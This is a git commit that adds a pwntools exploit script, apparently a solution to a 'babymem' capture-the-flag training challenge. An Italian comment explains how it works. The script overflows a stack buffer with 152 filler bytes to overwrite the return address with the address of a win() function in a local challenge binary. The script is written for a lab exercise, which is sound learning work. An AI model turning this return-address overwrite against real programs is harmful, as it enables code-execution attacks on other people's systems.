f00519325bb4f2fc05e090437b4be74aefa8b197
Ernesto Pastori <43282001+ernepasto@users.noreply.github.com>
2025-04-03 13:26:57 +0200

    Create babymem-level-3-1.py

---
+++ challenges/babymem-level-3-1.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python3
+from pwn import *
+
+'''
+-- OBIETTIVO DEL PROGRAMMA --
+Per risolvere la challenge è necessario cambiare il return address della funzione challenge() con l'indirizzo della funzione win(),
+per farlo bisogna calcolare la distanza tra il buffer e il return address (tramite gdb).
+Una volta a conoscenza della distanza tra i due si invia un bytestream della lunghezza necessaria
+a riempire il buffer e la restante memoria fino all'indirizzo del return address, seguito dal valore che si vuole
+inserire al posto del return address. Sostanzialmente si fa overflow del buffer per sovrascrivere 
+anche il return address con un valore a scelta (in questo caso l'indirizzo della funzione win()).
+-----------------------------
+'''
+
+context.log_level = 'CRITICAL'
+
+elf = ELF('/challenge/babymem-level-3-1')
+p = elf.process()
+
+delta_len = 152
+value = p64(elf.symbols['win'])
+bytestream = b'A' * delta_len + value
+
+p.sendline(f'{len(bytestream)}'.encode())
+p.sendline(bytestream)
+p.interactive()
